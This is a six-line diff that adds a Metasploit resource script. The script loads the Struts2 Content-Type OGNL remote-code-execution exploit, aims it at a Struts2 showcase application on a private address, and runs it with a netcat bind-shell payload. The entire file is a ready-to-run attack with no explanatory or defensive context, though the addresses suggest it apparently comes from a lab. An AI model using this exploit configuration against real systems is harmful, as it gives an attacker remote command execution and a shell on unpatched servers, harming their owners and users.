@@ -1,0 +1,6 @@
+use exploit/multi/http/struts2_content_type_ognl
+set TARGETURI /struts2_2.3.15.1-showcase/showcase.action
+set RHOST 10.10.10.101
+set PAYLOAD cmd/unix/bind_netcat
+set LHOST 172.16.0.10
+exploit
